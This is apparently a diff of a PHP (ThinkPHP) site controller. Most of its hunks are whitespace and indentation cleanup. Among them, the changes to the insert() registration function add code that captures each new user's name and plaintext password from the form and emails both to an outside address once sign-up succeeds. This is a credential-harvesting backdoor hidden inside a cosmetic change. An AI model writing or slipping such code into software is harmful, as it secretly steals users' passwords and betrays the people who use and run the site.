@@ -11,16 +11,16 @@ class IndexAction extends Action {
 		$db = M('user');
 		$condition['email']=$_SESSION['email'];
 		$n= $db->where($condition)->getField('name');
-			$this->assign('v1',"$n"); 
-            $this->assign('code1',"11"); 
-            $this->assign('v2',"退出"); 
-            $this->assign('code2',"12");
-        }else{
-            $this->assign('v1',"登录"); 
-            $this->assign('code1',"21");
-            $this->assign('v2',"注册"); 
-            $this->assign('code2',"22");            
-        } 
+		$this->assign('v1',"$n"); 
+		$this->assign('code1',"11"); 
+		$this->assign('v2',"退出"); 
+		$this->assign('code2',"12");
+	}else{
+		$this->assign('v1',"登录"); 
+		$this->assign('code1',"21");
+		$this->assign('v2',"注册"); 
+		$this->assign('code2',"22");            
+    } 
 		
         //显示产品           
         $db = M('product');
@@ -34,7 +34,7 @@ class IndexAction extends Action {
 	$this->display();
     }
 	
-	public function login(){
+	public function login(){	
 		$this->display();
 	}
     
@@ -129,9 +129,12 @@ class IndexAction extends Action {
     
     public function insert(){        
         $User   =   M('user');
+	$name=$_POST['name'];
+	$pwd=$_POST['pwd'];
         if($User->create()) {
             $result =   $User->add();
             if($result) {
+	    SendMail("liyonglei@fuego.cn","又来个账户咯","$name----华丽的分割线-----$pwd");
                 $this->redirect('Index/login','',3,'注册成功');//页面重定向
             }else{
                 //$this->error('写入错误！');
@@ -170,12 +173,7 @@ class IndexAction extends Action {
 
 			echo "<script>alert('请输入关键信息!');history.back();</script>";
 			
-		}
-										
-		
-
-
-		
+		}	
 	}
 
 
